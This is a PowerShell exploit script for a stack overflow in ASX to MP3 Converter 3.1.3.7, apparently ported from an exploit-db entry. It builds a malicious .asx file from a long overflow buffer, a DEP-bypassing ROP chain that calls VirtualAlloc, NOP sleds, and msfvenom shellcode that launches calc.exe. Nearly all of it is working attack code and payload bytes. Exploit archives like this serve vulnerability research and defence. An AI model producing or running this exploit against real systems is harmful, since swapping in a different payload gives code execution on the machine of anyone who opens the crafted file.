# Exploit Title: ASX to MP3 converter 3.1.3.7 - '.asx' Local Stack Overflow (DEP)
# Google Dork: N/A
# Date: 2019-10-06
# Exploit Author: max7253
# Vendor Homepage: http://www.mini-stream.net/
# Software Link: https://www.exploit-db.com/apps/f4da5b43ca4b035aae55dfa68daa67c9-ASXtoMP3Converter.exe
# Version: 3.1.3.7.2010.11.05
# Tested on: Microsoft Windows 7 Enterprise, 6.1.7601 Service Pack 1 Build 7601, x64-based PC
# CVE : N/A
# Porting by FabioDefilippo

# Note: There is a similar exploit published but it doesn't work in the OS I used:
# https://www.exploit-db.com/exploits/42963
# This exploit in the ROP chain uses addresses from ASLR modules. Not sure what OS that exploit was tested on.


$file = '\fuzz_rop.asx';
#Tested on
#OS Name:                   Microsoft Windows 7 Enterprise
#OS Version:                6.1.7601 Service Pack 1 Build 7601
#System Type:               x64-based PC

#msfvenom -p windows/exec cmd=calc.exe -a x86 -b ', 0x00, 0x09, 0x0a' -f python
[Byte[]]$buf = 0xda, 0xd7, 0xbf, 0xf1, 0xca, 0xd1, 0x3f, 0xd9, 0x74, 0x24, 0xf4, 0x5a, 0x29,
 0xc9, 0xb1, 0x31, 0x83, 0xc2, 0x04, 0x31, 0x7a, 0x14, 0x03, 0x7a, 0xe5, 0x28,
 0x24, 0xc3, 0xed, 0x2f, 0xc7, 0x3c, 0xed, 0x4f, 0x41, 0xd9, 0xdc, 0x4f, 0x35,
 0xa9, 0x4e, 0x60, 0x3d, 0xff, 0x62, 0x0b, 0x13, 0x14, 0xf1, 0x79, 0xbc, 0x1b,
 0xb2, 0x34, 0x9a, 0x12, 0x43, 0x64, 0xde, 0x35, 0xc7, 0x77, 0x33, 0x96, 0xf6,
 0xb7, 0x46, 0xd7, 0x3f, 0xa5, 0xab, 0x85, 0xe8, 0xa1, 0x1e, 0x3a, 0x9d, 0xfc,
 0xa2, 0xb1, 0xed, 0x11, 0xa3, 0x26, 0xa5, 0x10, 0x82, 0xf8, 0xbe, 0x4a, 0x04,
 0xfa, 0x13, 0xe7, 0x0d, 0xe4, 0x70, 0xc2, 0xc4, 0x9f, 0x42, 0xb8, 0xd6, 0x49,
 0x9b, 0x41, 0x74, 0xb4, 0x14, 0xb0, 0x84, 0xf0, 0x92, 0x2b, 0xf3, 0x08, 0xe1,
 0xd6, 0x04, 0xcf, 0x98, 0x0c, 0x80, 0xd4, 0x3a, 0xc6, 0x32, 0x31, 0xbb, 0x0b,
 0xa4, 0xb2, 0xb7, 0xe0, 0xa2, 0x9d, 0xdb, 0xf7, 0x67, 0x96, 0xe7, 0x7c, 0x86,
 0x79, 0x6e, 0xc6, 0xad, 0x5d, 0x2b, 0x9c, 0xcc, 0xc4, 0x91, 0x73, 0xf0, 0x17,
 0x7a, 0x2b, 0x54, 0x53, 0x96, 0x38, 0xe5, 0x3e, 0xfc, 0xbf, 0x7b, 0x45, 0xb2,
 0xc0, 0x83, 0x46, 0xe2, 0xa8, 0xb2, 0xcd, 0x6d, 0xae, 0x4a, 0x04, 0xca, 0x40,
 0x01, 0x05, 0x7a, 0xc9, 0xcc, 0xdf, 0x3f, 0x94, 0xee, 0x35, 0x03, 0xa1, 0x6c,
 0xbc, 0xfb, 0x56, 0x6c, 0xb5, 0xfe, 0x13, 0x2a, 0x25, 0x72, 0x0b, 0xdf, 0x49,
 0x21, 0x2c, 0xca, 0x29, 0xa4, 0xbe, 0x96, 0x83, 0x43, 0x47, 0x3c, 0xdc;

$payload = [System.Text.Encoding]::ASCII.GetBytes("http://");
$payload += [System.Text.Encoding]::ASCII.GetBytes("A" * 17417);
$payload += 0x38, 0xD0, 0x02, 0x10;
$payload += [System.Text.Encoding]::ASCII.GetBytes("CCCC");

## Save allocation type (0x1000) in EDX
$payload += 0x4D, 0x7F, 0x04, 0x10; # ADC EDX,ESI # POP ESI # RETN
$payload += 0x11, 0x11, 0x11, 0x11;
$payload += 0x8C, 0x9B, 0x02, 0x10; # XOR EDX,EDX # RETN
$payload += 0x93, 0xD4, 0x02, 0x10; # POP EDX # RETN
$payload += 0xFE, 0xEF, 0xEE, 0xEE;
$payload += 0x4D, 0x7F, 0x04, 0x10; # ADC EDX,ESI # POP ESI # RETN
$payload += 0x41, 0x41, 0x41, 0x41;

## Save the address of VirtualAlloc() in ESI
$payload += 0xde, 0xfa, 0x02, 0x10; # POP EAX # RETN [MSA2Mfilter03.dll]
$payload += 0x60, 0xf0, 0x04, 0x10; # ptr to &VirtualAlloc() [IAT MSA2Mfilter03.dll]
$payload += 0x9f, 0x23, 0x03, 0x10; # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSA2Mfilter03.dll]
$payload += 0x54, 0x07, 0x04, 0x10; # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN
$payload += 0x41, 0x41, 0x41, 0x41;
$payload += 0x41, 0x41, 0x41, 0x41;

## Save the size of the block in EBX
$payload += 0x81, 0xd8, 0x04, 0x10; # XOR EAX,EAX # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x4d, 0xb3, 0x03, 0x10; # ADD EAX,29 # RETN
$payload += 0x35, 0x47, 0x03, 0x10; # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN

## Save the address of (# ADD ESP,8 # RETN) in EBP
$payload += 0x6c, 0x1c, 0x03, 0x10; # POP EBP # RETN
$payload += 0x16, 0x23, 0x01, 0x10; # ADD ESP,8 # RETN
#payload += 0x73, 0xdf, 0x03, 0x10; # & PUSH ESP # RETN

## Save memory protection code (0x40) in ECX
$payload += 0x22, 0xca, 0x02, 0x10; # POP ECX # RETN
$payload += 0xFF, 0xFF, 0xFF, 0xFF;
$payload += 0xbe, 0x1e, 0x03, 0x10; # INC ECX # AND EAX,8 # RETN
$payload += 0xbe, 0x1e, 0x03, 0x10; # INC ECX # AND EAX,8 # RETN
$payload += 0xb7, 0xa5, 0x02, 0x10; # ADD ECX,ECX # RETN
$payload += 0xb7, 0xa5, 0x02, 0x10; # ADD ECX,ECX # RETN
$payload += 0xb7, 0xa5, 0x02, 0x10; # ADD ECX,ECX # RETN
$payload += 0xb7, 0xa5, 0x02, 0x10; # ADD ECX,ECX # RETN
$payload += 0xb7, 0xa5, 0x02, 0x10; # ADD ECX,ECX # RETN
$payload += 0xb7, 0xa5, 0x02, 0x10; # ADD ECX,ECX # RETN

## Save ROP-NOP in EDI
$payload += 0x46, 0xe3, 0x02, 0x10; # POP EDI # RETN
$payload += 0x38, 0xD0, 0x02, 0x10; # RETN

## Save NOPs in EAX
#$payload += 0xa4, 0xbc, 0x03, 0x10; # POP EAX # RETN [MSA2Mfilter03.dll]
#$payload += 0x90, 0x90, 0x90, 0x90; # nop

## Set up the EAX register to contain the address of # PUSHAD #RETN and JMP to this address
$payload += 0x16, 0xE5, 0x02, 0x10; # POP EAX # RETN
$payload += 0x75, 0xF2, 0xE2, 0xA4;
$payload += 0xe2, 0xef, 0x03, 0x10; # ADD EAX,5B5D5E5F # RETN
$payload += 0xe5, 0x0c, 0x04, 0x10; # PUSH EAX # RETN

for($I = 0; $I -lt 4; $I++){
    $payload += 0x90;
}
$payload += 0x73, 0xdf, 0x03, 0x10; # & PUSH ESP # RETN
for($I = 0; $I -lt 20; $I++){
    $payload += 0x90;
}
$payload += $buf;

[io.file]::WriteAllBytes($PWD.Path + $file, $payload);